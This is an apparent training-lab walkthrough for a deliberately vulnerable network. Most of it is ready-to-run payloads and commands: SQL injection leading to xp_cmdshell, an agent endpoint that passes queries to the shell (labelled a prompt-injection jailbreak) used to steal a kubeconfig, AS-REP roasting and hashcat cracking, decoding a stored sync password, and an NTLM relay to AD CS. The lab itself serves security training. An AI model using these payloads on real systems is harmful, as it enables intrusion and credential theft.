# 📓 MODERN KILL LAB: OPERATOR'S FIELD GUIDE

**Objective:** This guide details the step-by-step exploitation paths for the Modern Kill Lab.

**Attacker Machine:** You can use your own Kali Linux VM (connected to the `psycholab` network) or the `Lab-Web01` machine (via SSH) to launch some of these attacks.

---

## 🛑 VECTOR 1: SQL Injection (Data Exfiltration)

**Target:** Legacy HR Portal (`Lab-DC01`)  
**URL:** `http://10.0.0.10/hr_portal`

### 1. Reconnaissance

The application takes an `id` parameter via the URL.

* **Action:** Open your browser to `http://10.0.0.10/hr_portal/index.php?id=1`
* **Observation:** The page returns "Name: Alice Manager".

### 2. Vulnerability Testing

We need to see if the input is sanitized.

* **Action:** Add a single quote `'` to the end of the ID.
* **URL:** `http://10.0.0.10/hr_portal/index.php?id=1'`
* **Result:** You should see a PHP/SQL error or a blank page. This confirms the syntax is broken = **Vulnerable**.

### 3. Exploitation (UNION Based)

We will use the `UNION` operator to join our own query to the existing one. We need to guess the number of columns.

* **Try 1 (Guessing 1 column):** `?id=1 UNION SELECT 1` (Likely fails)
* **Try 2 (Guessing 2 columns):** `?id=1 UNION SELECT 1, 2`
* **Result:** If the page loads "1" or "2" on the screen, we have 2 columns.

### 4. Data Dump (The Loot)

Now we extract the database version and user.

* **Payload:** `?id=1 UNION SELECT @@version, user_name()`
* **Result:** The page will display the Microsoft SQL Server version and the user `LAB\svc_sql`.

### 5. Advanced: Enable Shell Access (xp_cmdshell)

Since the user is likely `db_owner` or `sysadmin` (due to bad config):

* **Payload (Enable Advanced Options):**
  ```
  ?id=1; EXEC sp_configure 'show advanced options', 1; RECONFIGURE;--
  ```
* **Payload (Enable xp_cmdshell):**
  ```
  ?id=1; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
  ```
* **Payload (Execute Command - Ping Check):**
  ```
  ?id=1; EXEC xp_cmdshell 'ping 10.0.0.20';--
  ```

---

## 🤖 VECTOR 2: AI Prompt Injection to RCE

**Target:** NeuroCorp Internal AI (`Lab-Web01`)  
**URL:** `http://10.0.0.20:5000`

### 1. Reconnaissance

The tool claims to be a "System Agent".

* **Action:** Visit `http://10.0.0.20:5000/ask?query=hello`
* **Observation:** It might return an error or a generic response. The error message is key—it usually reveals it's running Python `subprocess`.

### 2. Prompt Engineering (The "Jailbreak")

We want to see if we can escape the intended logic.

* **Payload:** `http://10.0.0.20:5000/ask?query=list files`
* **Result:** It might fail, or it might execute `list` as a shell command (which doesn't exist).

### 3. Command Injection (RCE)

The vulnerability is that the python script takes your `query` and passes it to the OS shell.

* **Payload:** `http://10.0.0.20:5000/ask?query=ls -la`
* **Result:** You see the file listing of the web directory.

### 4. Privilege Escalation / Pivot

Let's see who we are and steal the K3s config.

* **Payload:** `http://10.0.0.20:5000/ask?query=whoami` (Result: `root`)
* **Payload (Steal Kubeconfig):**
  ```
  http://10.0.0.20:5000/ask?query=cat /home/vagrant/.kube/config
  ```
* **Impact:** You now have the Kubernetes admin configuration. You can copy this to your attacker machine and control the cluster.

---

## 🔨 VECTOR 3: AS-REP Roasting (Identity Attack)

**Target:** Active Directory (`Lab-DC01`)  
**Requirement:** Network access (no credentials needed).

### 1. The Theory

If a user account has "Do not require Kerberos preauthentication" enabled, anyone can request a TGT (Ticket Granting Ticket) for that user. The TGT is encrypted with the user's password hash. We can take that offline and crack it.

### 2. The Execution (Kali)

* **Tool:** Impacket (`GetNPUsers.py`)
* **Command:**
  ```bash
  GetNPUsers.py LAB.local/ -usersfile users.txt -format hashcat -outputfile hashes.asrep -dc-ip 10.0.0.10
  ```
  *(Note: You might need a list of potential usernames. "svc_backup" is a good guess).*

* **Targeted Command:**
  ```bash
  GetNPUsers.py LAB.local/svc_backup -no-pass -dc-ip 10.0.0.10
  ```

### 3. The Crack

* **Result:** You receive a hash starting with `$krb5asrep$...`
* **Action:** Use Hashcat mode 18200.
  ```bash
  hashcat -m 18200 hashes.asrep /usr/share/wordlists/rockyou.txt
  ```
* **Password Found:** `Backup2024!`

---

## ☁️ VECTOR 4: Hybrid Identity Lateral Movement

**Target:** Azure AD Connect Decoy (`Lab-DC01`)  
**Access Required:** You need initial access to DC01 (e.g., via RDP with `vagrant` or `svc_backup` credentials).

### 1. The Hunt

Attackers look for the "AD Sync" service account passwords which are often stored on disk.

* **Action:** Open File Explorer on DC01.
* **Path:** Navigate to `C:\Program Files\Azure AD Sync\`

### 2. The Loot

* **Action:** Open the file `connection.xml`.
* **Observation:** Look for the `<PasswordEncrypted>` tag.
* **Value:** `VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ==`

### 3. The Crack

This "encryption" is usually just Base64 or DPAPI. In this lab, it's Base64.

* **Action:** Open PowerShell.
* **Command:**
  ```powershell
  [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String("VABhAGwAbABoAGEAbABsAGEAMQAyADMAIQ=="))
  ```
* **Result:** `Valhalla123!`

---

## 🛡️ VECTOR 5: AD CS Relay (ESC8)

**Target:** Certificate Authority (`Lab-DC01`)  
**Requirement:** An attacker machine (Kali) on the same network.

### 1. Verification

* **Action:** Open a browser or use curl.
* **URL:** `http://10.0.0.10/certsrv`
* **Observation:** You are prompted for a username/password via HTTP.
* **Why this is bad:** It is using **HTTP** (unencrypted). If it were HTTPS, relaying would be much harder.

### 2. The Attack Concept (Steps for Kali)

*This requires a separate Kali VM connected to the `psycholab` network.*

1. **Run Responder:**
   ```bash
   sudo responder -I eth0 -rdw
   ```
   *(Disables SMB/HTTP servers to allow relay)*

2. **Run NTLMrelayx:**
   ```bash
   ntlmrelayx.py -t http://10.0.0.10/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
   ```

3. **Trigger:** Force `Lab-DC01` to authenticate to you (e.g., via SQLi `xp_cmdshell 'ping <YOUR_KALI_IP>'`).

4. **Result:** NTLMrelayx forwards the machine account credentials to the Cert Authority, requests a certificate, and dumps a `.pfx` file. You can use this certificate to authenticate as the Domain Controller itself.

---

*End of Guide. Proceed with caution.*
